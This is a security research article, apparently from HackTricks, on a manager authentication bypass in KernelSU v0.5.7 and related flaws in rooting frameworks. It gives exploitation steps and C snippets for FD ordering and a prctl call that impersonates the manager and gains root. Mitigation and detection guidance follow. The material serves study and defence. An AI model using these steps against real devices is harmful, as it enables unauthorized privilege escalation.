# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU, APatch, SKRoot와 같은 Rooting frameworks는 Android/Linux kernel을 patch하거나 hook하여 권한 없는 userspace manager app에 privileged functionality를 노출합니다. Magisk는 CVE-2024-48336이 이 KernelSU syscall 경로가 아니라 manager-side code loading과 관련되었으므로 아래에서 별도로 설명합니다.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

이 페이지는 공개 research, 특히 Zimperium의 KernelSU v0.5.7 분석에서 확인된 techniques와 pitfalls를 추상화하여 red team과 blue team 모두가 attack surfaces, exploitation primitives 및 견고한 mitigations를 이해할 수 있도록 합니다.<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- KernelSU v0.5.7에서는 kernel hook이 `prctl`에서 magic value, command ID 및 userspace의 command-specific arguments를 받습니다.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- 호출자는 먼저 `CMD_BECOME_MANAGER`로 manager status를 요청합니다. Authorization은 command-specific입니다. `CMD_GRANT_ROOT`는 manager/allowlist state를 확인하고, `CMD_ALLOW_SU`는 manager-only이며, 이 버전에서 `CMD_SET_SEPOLICY`는 root-only입니다.<sup>[[2]](#references)[[11]](#references)</sup>
- 다른 commands는 version/configuration을 조회하거나 framework events를 보고합니다.<sup>[[2]](#references)</sup>
- 모든 app이 이 syscall interface를 호출할 수 있으므로 manager authentication의 정확성이 중요합니다.<sup>[[1]](#references)[[2]](#references)</sup>

Example (KernelSU design):
- Hooked syscall: prctl
- KernelSU handler로 divert하기 위한 magic value: 0xDEADBEEF
- Commands include: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (as implemented)

userspace가 prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)를 호출하면 KernelSU는 다음을 검증합니다.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- 제공된 path는 caller UID에 대해 예상되는 prefix로 시작해야 합니다. 예: /data/data/<pkg> 또는 /data/user/<id>/<pkg>.
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- 해당 path는 caller UID가 소유해야 합니다.
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) FD table scan을 통한 APK signature check
- calling process의 open file descriptors를 descriptor order가 증가하는 순서로 순회합니다.
- 각 regular file에 대해 path가 `/data/app/`로 시작하고 `/base.apk`로 끝나는 경우, path에 제공된 data-directory path에서 파생된 package substring이 포함되어 있어야 합니다.
- 이러한 path checks를 통과한 첫 번째 candidate의 signature를 검증합니다.
- APK v2 signature를 parse하고 official manager certificate와 대조하여 검증합니다.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

모든 checks가 통과하면 kernel은 manager의 UID를 일시적으로 cache합니다. 이후 manager-only commands는 해당 UID를 허용하며, 다른 commands는 자체 UID 또는 allowlist checks를 유지합니다.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7은 signature result를 PackageManager의 installed package identity에 bind하지 않습니다. `manager.c`에서 package test는 path substring check(`strstr(cwd, pkg)`)일 뿐이며, 이 test를 통과한 첫 번째 candidate가 signature check 대상이 됩니다. 따라서 attacker는 genuine manager APK를 attacker의 package name도 포함하는 `/data/app/` path 아래에 배치하고, 해당 APK가 먼저 선택되도록 할 수 있습니다.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

이러한 trust-by-indirection을 통해 unprivileged app은 manager의 signing key를 소유하지 않고도 manager를 impersonate할 수 있습니다.<sup>[[1]](#references)</sup>

악용되는 주요 properties:<sup>[[1]](#references)[[3]](#references)</sup>
- FD scan은 descriptor index 순서로 수행되며, package check는 검증된 package-to-APK identity binding이 아니라 path substring test입니다.
- open()은 사용 가능한 가장 낮은 FD를 반환합니다. 낮은 번호의 FDs를 먼저 닫으면 attacker가 ordering을 제어할 수 있습니다.
- Bundled manager APK는 official manager signature를 유지한 채 attacker의 package string을 포함하는 `/data/app/` path 아래에 배치할 수 있습니다.

---
## Attack preconditions

구체적인 KernelSU v0.5.7 case에는 다음이 필요합니다.<sup>[[1]](#references)[[3]](#references)</sup>

- Device가 이미 vulnerable rooting framework(예: KernelSU v0.5.7)로 rooted 상태여야 합니다.
- Attacker가 local에서 임의의 unprivileged code(Android app process)를 실행할 수 있어야 합니다.
- v0.5.7 implementation에서는 `current->real_parent`의 UID가 0이어야 합니다(source comment에서는 이를 zygote direct-child requirement로 설명함). `manager.c`는 다른 parents를 거부합니다.<sup>[[3]](#references)</sup>
- Real manager가 아직 authenticated되지 않은 상태여야 합니다(예: reboot 직후). 일부 frameworks는 성공 후 manager UID를 cache하므로 race에서 이겨야 합니다.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps (d demo video는 public proof of concept가 동작하는 모습을 보여줍니다):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Prefix 및 ownership checks를 충족하도록 자체 app data directory에 대한 유효한 path를 구성합니다.
2) Genuine KernelSU Manager base.apk를 package string이 포함된 `/data/app/` path에 배치한 다음, 자체 base.apk보다 낮은 번호의 FD에서 엽니다.
3) prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)를 호출하여 checks를 통과합니다.
4) `CMD_GRANT_ROOT`를 사용한 다음, persistent su를 위해 `CMD_ALLOW_SU`를 사용합니다. root-only `CMD_SET_SEPOLICY`는 root를 획득한 후 지원되는 경우에만 호출합니다.

Step 2의 practical notes (FD ordering):<sup>[[1]](#references)</sup>
- /proc/self/fd symlinks를 순회하여 자체 process에서 자신의 /data/app/*/base.apk에 해당하는 FD를 식별합니다.
- 낮은 FD(예: stdin, fd 0)를 닫고 legitimate manager APK를 먼저 열어 fd 0(또는 자체 base.apk fd보다 낮은 index)을 차지하도록 합니다.
- Legitimate manager APK를 app에 bundle하여 path가 `/data/app/`로 시작하고 `/base.apk`로 끝나며 package string을 포함하도록 합니다. 예를 들어 app의 `lib` directory 아래 path가 이러한 checks를 충족할 수 있습니다.<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, illustrative only):

Open FDs를 열거하여 base.apk entries를 찾습니다:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
더 낮은 번호의 FD가 정식 manager APK를 가리키도록 강제:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
KernelSU v0.5.7 `prctl` hook을 통한 Manager 인증:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
성공 후 privileged commands (예시):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: 현재 프로세스를 root로 승격
- CMD_ALLOW_SU: 지속적인 su를 위해 패키지/UID를 allowlist에 추가
- CMD_SET_SEPOLICY: root 획득 후 SELinux policy 조정; KernelSU v0.5.7은 이 command에 대해 UID 0을 확인합니다.<sup>[[2]](#references)</sup>

Race/persistence 팁:
- AndroidManifest (`RECEIVE_BOOT_COMPLETED`)에 BOOT_COMPLETED receiver를 등록하여 reboot 후 시작하고 실제 manager보다 먼저 authentication을 시도합니다. 이 permission은 `ACTION_BOOT_COMPLETED` 수신을 허용하지만, 그 자체로 scheduling priority를 보장하지는 않습니다.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Detection and mitigation guidance

framework 개발자용:
- authentication을 임의의 FD가 아니라 호출자의 package/UID에 binding합니다:
- UID에서 호출자의 package를 확인하고, FD를 scanning하는 대신 PackageManager를 통해 설치된 package의 signature와 대조하여 검증합니다.
- kernel-only인 경우 안정적인 호출자 identity(task creds)를 사용하고, process FD가 아닌 init/userspace helper가 관리하는 안정적인 source of truth에서 검증합니다.
- path-prefix check를 identity로 사용하지 않습니다. 호출자가 이를 쉽게 충족할 수 있습니다.
- channel에서 nonce 기반 challenge–response를 사용하고, boot 또는 주요 event 발생 시 cached manager identity를 삭제합니다.
- 가능한 경우 generic syscall에 의존하는 대신 binder 기반 authenticated IPC를 고려합니다.

defender/blue team용:
- rooting framework와 manager process의 존재를 탐지합니다. kernel telemetry가 있다면 의심스러운 magic constant(예: 0xDEADBEEF)를 사용하는 prctl call을 모니터링합니다.<sup>[[1]](#references)[[11]](#references)</sup>
- managed fleet에서는 boot 직후 privileged manager command를 빠르게 시도하는 신뢰할 수 없는 package의 boot receiver를 차단하거나 alert를 생성합니다.
- device가 patched framework version으로 업데이트되었는지 확인하고, update 시 cached manager ID를 무효화합니다.

공격의 제한 사항:<sup>[[1]](#references)[[2]](#references)</sup>
- 이미 취약한 framework로 rooted된 device에만 영향을 줍니다.
- 일반적으로 legitimate manager가 authentication하기 전 reboot/race window가 필요합니다. 일부 framework는 reset될 때까지 manager UID를 cache합니다.

---
## Related notes across frameworks

- Password 기반 auth(예: 과거 APatch/SKRoot build)는 password를 추측하거나 bruteforce할 수 있거나 validation에 bug가 있는 경우 취약할 수 있습니다.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature 기반 auth(예: KernelSU)는 원칙적으로 더 강력하지만, FD scan을 통해 선택된 path-derived artefact가 아니라 실제 호출자에 binding되어야 합니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336은 검증되지 않은 GMS package에서 code를 load한 pre-Canary 27007 build에 영향을 주었으며, local app이 Magisk app에서 code를 실행하고 user interaction 없이 root로 escalate할 수 있었습니다.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – 모든 악의 근원인 Rooting: Mobile Device를 Compromise할 수 있는 Security Hole](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c authentication checks](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – manager.c FD iteration, package check and signature call](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – apk_sign.c APK v2 verification](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk issue #8279 – GMS가 system app인지 검증](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – ksu.h command identifiers](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
